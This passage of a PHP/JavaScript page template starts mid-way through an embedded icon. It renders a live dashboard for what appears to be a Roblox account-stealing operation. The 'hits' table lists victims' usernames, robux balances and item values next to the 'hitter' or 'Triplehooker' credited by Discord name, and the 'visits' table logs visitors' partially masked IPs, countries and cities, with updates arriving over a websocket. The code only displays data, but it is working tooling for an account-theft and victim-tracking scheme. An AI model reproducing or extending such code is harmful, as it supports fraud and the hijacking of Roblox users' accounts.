Lz48cGF0aCBmaWxsPSIjN2I3YjdiIiBkPSJNMjUwIDIwNGgxbDEgOGgzYzEuNCAyLjcgMSA1IDEgOGgtMXYtNWwtNS0yeiIvPjxwYXRoIGZpbGw9IiNjZGNkY2QiIGQ9Ik0zODkgMjA0aDJjMCAxLjggMCAxLjgtMSA0LTQgMi43LTcuMiA0LjQtMTIgNSAxLjYtMy4yIDQuOC0zLjYgOC01bDEtMmgyeiIvPjxwYXRoIGZpbGw9IiM5NDk0OTQiIGQ9Ik0xNzUgMTYwaDNsMSA0LjguNyAyLjZjLjMgMi42LjEgNC4yLS43IDYuNmwtMi01LjktMS4xLTMuM2MtLjktMi44LS45LTIuOC0uOS00LjgiLz48cGF0aCBmaWxsPSIjNmM2YzZjIiBkPSJtMTcxIDIyMCAyIDJjLTIuMSAxLjYtMi4xIDEuNi01IDMtMy4zLS44LTMuMy0uOC02LTJ2LTFsNC40LTEuMSAyLjQtLjd6Ii8+PHBhdGggZmlsbD0iI2NiY2JjYiIgZD0iTTE5NyAyMDZoMmwtMyAxMGgtMmwxLTQuNC41LTIuNWMuNS0yLjEuNS0yLjEgMS41LTMuMSIvPjxwYXRoIGZpbGw9IiM3YTdhN2EiIGQ9Ik0xNzcgMTU4aDJjMS42IDIuOCAxLjYgMi44IDMgNmwtMSAzLTItMXYtM2wtMi0xeiIvPjxwYXRoIGZpbGw9IiM4MjgyODIiIGQ9Im0zMDQgMTU0IDQgNC0xIDJoLTJsLTEgM2MtLjktNi4yLS45LTYuMi0xLTh6Ii8+PHBhdGggZmlsbD0iI2NlY2VjZSIgZD0ibTE0MyAyMTUtMSAzaC02bDEtM2MyLjUtMS4yIDMuNC0uOCA2IDAiLz48cGF0aCBmaWxsPSIjOTU5NTk1IiBkPSJNMTgwIDE3NGMzIDIgMyAyIDMuNSA0LjJsLjIgMi40LjIgMi41LjEgMS45Yy0yLjMtMi4zLTIuNS0zLjUtMy4xLTYuNmwtLjUtMi41eiIvPjxwYXRoIGZpbGw9IiM3MjcyNzIiIGQ9Ik0yODcgMjE1Yy44IDEuNy44IDEuNyAxIDQtMi40IDIuOC0yLjQgMi44LTUgNWwtMi0xIDMuOC00LjVjMS4zLTEuNSAxLjMtMS41IDIuMi0zLjUiLz48cGF0aCBmaWxsPSJncmF5IiBkPSJNMTk5IDE3NGgxdjhsLTMgMWMuOS03LjkuOS03LjkgMi05TTM0MyAyMTNsMyAxdjVsLTMgMXoiLz48cGF0aCBmaWxsPSIjN2Q3ZDdkIiBkPSJNMjAyIDIwM2MuNyAxLjYuNyAxLjYgMSA0LTEuNCAzLjMtMS40IDMuMy0zIDYtMS4zLTMuOC0uNC01LjQgMS05eiIvPjxwYXRoIGZpbGw9IiNlNmU2ZTYiIGQ9Im0zOTQgMTY2IDIgMXYzaDJsMSA0LTMtMS0xIDJ6Ii8+PHBhdGggZmlsbD0iI2NjYyIgZD0ibTI0OSAyMTQgNSAydjNoLTR6Ii8+PHBhdGggZmlsbD0iIzljOWM5YyIgZD0iTTM4NiAxNzBjMiAuOCAyIC44IDQgMiAuOCAyLjEuOCAyLjEgMSA0bC0zIDF6Ii8+PHBhdGggZmlsbD0iIzg4OCIgZD0iTTIwNSAxNTloM2wtMSA1aC0zeiIvPjwvc3ZnPg==" class="robux-icon" alt=""> RAP</div>
        <div class="live-th"><?= $isTriplehook ? '<i class="fas fa-layer-group"></i> Triplehooker' : '<i class="fas fa-crosshairs"></i> Hitter' ?></div>
    </div>

    <div class="live-visits-thead" id="liveVisitsThead">
        <div class="live-th"><i class="fas fa-globe"></i> IP</div>
        <div class="live-th"><i class="fas fa-clock"></i> Time</div>
        <div class="live-th"><i class="fas fa-map-marker-alt"></i> Country</div>
        <div class="live-th"><i class="fas fa-city"></i> City</div>
        <div class="live-th"><i class="fas fa-tag"></i> Type</div>
    </div>

    <div class="live-hits-tbody" id="live-hits-tbody"></div>
    <div class="live-visits-tbody" id="live-visits-tbody"></div>
</div>
<script>
var LiveHitsConfig={
    isTriplehook:<?= $isTriplehook ? 'true' : 'false' ?>
};
var INITIAL_HITS=<?= json_encode($initialHits, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?: '[]' ?>;

var liveMode='hits';

function animateSwitch(thead,tbody){
    var rows=tbody.querySelectorAll('.live-hit-row,.live-visit-row');
    for(var i=0;i<rows.length;i++){
        rows[i].style.animation='none';
        rows[i].offsetWidth;
        rows[i].style.animation='lhRowSlide .35s ease '+(i*0.04)+'s both';
    }
    var title=document.getElementById('liveCardTitle');
    title.style.animation='none';
    title.offsetWidth;
    title.style.animation='lhFade .35s ease both';
}

function toggleLiveMode(){
    if(liveMode==='hits'){
        liveMode='visits';
        document.getElementById('liveCardTitle').textContent='Live Visits(LOCAL)';
        document.getElementById('liveSwitchLink').textContent='Click to switch to Live Hits';
        document.getElementById('liveHitsThead').style.display='none';
        var vThead=document.getElementById('liveVisitsThead');
        vThead.style.display='grid';
        document.getElementById('live-hits-tbody').style.display='none';
        var vTbody=document.getElementById('live-visits-tbody');
        vTbody.style.display='flex';
        animateSwitch(vThead,vTbody);
    }else{
        liveMode='hits';
        document.getElementById('liveCardTitle').textContent='Live Hits';
        document.getElementById('liveSwitchLink').textContent='Click to switch to Live Visits(LOCAL)';
        var hThead=document.getElementById('liveHitsThead');
        hThead.style.display='grid';
        document.getElementById('liveVisitsThead').style.display='none';
        var hTbody=document.getElementById('live-hits-tbody');
        hTbody.style.display='flex';
        document.getElementById('live-visits-tbody').style.display='none';
        animateSwitch(hThead,hTbody);
    }
}

var LiveHits=(function(){
    var knownIds=new Set();
    var maxRows=6;
    function esc(t){var d=document.createElement('div');d.textContent=t;return d.innerHTML}
    function escAttr(t){var d=document.createElement('div');d.textContent=t;return d.innerHTML.replace(/"/g,'&quot;')}
    function fmt(n){n=parseInt(n)||0;return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ')}
    function fmtBalance(n){return fmt(n)+' R$'}
    function parseDate(dateStr){
        if(!dateStr)return null;
        var s=String(dateStr).replace(' ','T');
        if(s.indexOf('Z')===-1&&s.indexOf('+')===-1)s+='Z';
        var d=new Date(s);
        return isNaN(d)?null:d;
    }
    function formatTime(dateStr){
        var d=parseDate(dateStr);
        if(!d)return '';
        var h=d.getHours(),m=d.getMinutes(),ampm=h>=12?'PM':'AM';
        h=h%12;h=h?h:12;m=m<10?'0'+m:m;
        return h+':'+m+' '+ampm;
    }
    function row(h){
        var time=h.time||formatTime(h.created_at)||'';
        var username=h.username||'Unknown';
        var balance=h.balance||h.robux||0;
        var summary=h.summary||0;
        var rap=h.rap||0;
        var userAvatar=h.userAvatar||h.avatar_url||'https://robohash.org/'+encodeURIComponent(username)+'?set=set4';
        var hitter=h.hitter||h.discord_username||'';
        var hitterAvatar=h.hitterAvatar||h.discord_avatar||'https://cdn.discordapp.com/embed/avatars/0.png';
        var hitterHidden=parseInt(h.hitter_avatar_hidden||h.avatar_hidden||0)===1;
        if(hitterHidden){hitter='Anonymous';hitterAvatar='https://app.ultima.cl/images/hide.png';}
        return '<div class="live-hit-row new-hit" data-id="'+h.id+'">'+
            '<div class="live-td user-cell">'+
                '<img src="'+userAvatar+'" class="user-mini-avatar" alt="">'+
                '<span>'+esc(username)+'</span>'+
            '</div>'+
            '<div class="live-td">'+time+'</div>'+
            '<div class="live-td">'+fmtBalance(balance)+'</div>'+
            '<div class="live-td">'+fmt(summary)+'</div>'+
            '<div class="live-td">'+fmt(rap)+'</div>'+
            '<div class="live-td hitter-cell">'+
                (hitter?'<img src="'+hitterAvatar+'" class="user-mini-avatar" alt=""><span data-n="'+escAttr(hitter)+'"></span>':'<span class="special-message">'+(LiveHitsConfig.isTriplehook?'Unknown Triplehooker':'Unknown Hitter')+'</span>')+
            '</div>'+
        '</div>';
    }
    function add(h,animate){
        var tb=document.getElementById('live-hits-tbody');
        if(!tb)return;
        var hId=String(h.id);
        if(knownIds.has(hId))return;
        knownIds.add(hId);
        var n=document.createElement('div');
        n.innerHTML=row(h);
        var r=n.firstChild;
        if(!animate)r.classList.remove('new-hit');
        tb.insertBefore(r,tb.firstChild);
        if(animate)setTimeout(function(){r.classList.remove('new-hit')},600);
        var rows=tb.querySelectorAll('.live-hit-row');
        while(rows.length>maxRows){
            var last=rows[rows.length-1];
            knownIds.delete(last.getAttribute('data-id'));
            last.remove();
            rows=tb.querySelectorAll('.live-hit-row');
        }
    }
    function clearAll(){
        var tb=document.getElementById('live-hits-tbody');
        if(tb)tb.innerHTML='';
        knownIds=new Set();
    }
    function init(){}
    return{add:add,clearAll:clearAll,init:init};
})();

var LiveVisits=(function(){
    var knownIds=new Set();
    var maxRows=6;
    function esc(t){var d=document.createElement('div');d.textContent=t;return d.innerHTML}
    function parseDate(dateStr){
        if(!dateStr)return null;
        var s=String(dateStr).replace(' ','T');
        if(s.indexOf('Z')===-1&&s.indexOf('+')===-1)s+='Z';
        var d=new Date(s);
        return isNaN(d)?null:d;
    }
    function formatTime(dateStr){
        var d=parseDate(dateStr);
        if(!d)return '';
        var h=d.getHours(),m=d.getMinutes(),ampm=h>=12?'PM':'AM';
        h=h%12;h=h?h:12;m=m<10?'0'+m:m;
        return h+':'+m+' '+ampm;
    }
    function row(v){
        var time=formatTime(v.created_at)||'';
        var ip=v.ip_address||v.ip||'Unknown';
        var country=v.country||'—';
        var city=v.city||'—';
        var type=v.type||'link';
        var maskedIp=ip;
        var parts=ip.split('.');
        if(parts.length===4)maskedIp=parts[0]+'.'+parts[1]+'.*.*';
        var uid=v.uid||v.id;
        return '<div class="live-visit-row new-visit" data-id="'+uid+'">'+
            '<div class="live-td"><span class="visit-ip">'+esc(maskedIp)+'</span></div>'+
            '<div class="live-td">'+time+'</div>'+
            '<div class="live-td"><span class="visit-country">'+esc(country)+'</span></div>'+
            '<div class="live-td"><span class="visit-country">'+esc(city)+'</span></div>'+
            '<div class="live-td"><span class="visit-type">'+type+'</span></div>'+
        '</div>';
    }
    function add(v,animate){
        var tb=document.getElementById('live-visits-tbody');
        if(!tb)return;
        var vId=String(v.uid||v.id);
        if(knownIds.has(vId))return;
        knownIds.add(vId);
        var n=document.createElement('div');
        n.innerHTML=row(v);
        var r=n.firstChild;
        if(!animate)r.classList.remove('new-visit');
        tb.insertBefore(r,tb.firstChild);
        if(animate)setTimeout(function(){r.classList.remove('new-visit')},600);
        var rows=tb.querySelectorAll('.live-visit-row');
        while(rows.length>maxRows){
            var last=rows[rows.length-1];
            knownIds.delete(last.getAttribute('data-id'));
            last.remove();
            rows=tb.querySelectorAll('.live-visit-row');
        }
    }
    function clearAll(){
        var tb=document.getElementById('live-visits-tbody');
        if(tb)tb.innerHTML='';
        knownIds=new Set();
    }
    function init(){}
    return{add:add,clearAll:clearAll,init:init};
})();

var LiveSocket=(function(){
    // Bağlantı ve şifre çözme paylaşımlı istemcide (window.ultimaWS).
    // Bu modül sadece 'live' kanalına abone olup gelen mesajları işler.
    function applySnapshot(d){
        if(d.hits&&Array.isArray(d.hits)){
            applyHitsFull(d.hits);
        }
        if(d.visits&&Array.isArray(d.visits)){
            LiveVisits.clearAll();
            var ordered2=d.visits.slice().reverse();
            for(var j=0;j<ordered2.length;j++)LiveVisits.add(ordered2[j],false);
        }
    }

    function applyHitsFull(rows){
        if(!Array.isArray(rows))return;
        var existingRows=document.querySelectorAll('#live-hits-tbody .live-hit-row');
        var existingIds=new Set();
        for(var k=0;k<existingRows.length;k++)existingIds.add(existingRows[k].getAttribute('data-id'));
        var ordered=rows.slice().reverse();
        for(var i=0;i<ordered.length;i++){
            var isNew=!existingIds.has(String(ordered[i].id));
            LiveHits.add(ordered[i],isNew);
        }
    }

    function applyVisitsFull(rows){
        if(!Array.isArray(rows))return;
        var existingRows=document.querySelectorAll('#live-visits-tbody .live-visit-row');
        var existingIds=new Set();
        for(var k=0;k<existingRows.length;k++)existingIds.add(existingRows[k].getAttribute('data-id'));
        var ordered=rows.slice().reverse();
        for(var i=0;i<ordered.length;i++){
            var uid=String(ordered[i].uid||ordered[i].id);
            var isNew=!existingIds.has(uid);
            LiveVisits.add(ordered[i],isNew);
        }
    }

    function handleLiveMessage(msg){
        if(!msg||!msg.type)return;
        if(msg.type==='ping'||msg.type==='ready')return;
        if(msg.type==='snapshot'){applySnapshot(msg);return}
        if(msg.type==='hits_full'){applyHitsFull(msg.rows);return}
        if(msg.type==='visits_full'){applyVisitsFull(msg.rows);return}
        if(msg.type==='hit'&&Array.isArray(msg.rows)){
            for(var i=0;i<msg.rows.length;i++)LiveHits.add(msg.rows[i],true);
            return;
        }
        if(msg.type==='visit'&&Array.isArray(msg.rows)){
            for(var j=0;j<msg.rows.length;j++)LiveVisits.add(msg.rows[j],true);
            return;
        }
    }

    function start(){
        function trySubscribe(){
            if(!window.ultimaWS||typeof window.ultimaWS.subscribe!=='function'){
                setTimeout(trySubscribe,50);return;
            }
            window.ultimaWS.subscribe('live',handleLiveMessage);
        }
        trySubscribe();
    }

    return{start:start};
})();

function bootLiveHits(){
    if(Array.isArray(INITIAL_HITS)&&INITIAL_HITS.length){
        var ordered=INITIAL_HITS.slice().reverse();
        for(var i=0;i<ordered.length;i++)LiveHits.add(ordered[i],false);
    }
    LiveSocket.start();
}
document.readyState==='loading'?document.addEventListener('DOMContentLoaded',bootLiveHits):bootLiveHits();
</script>
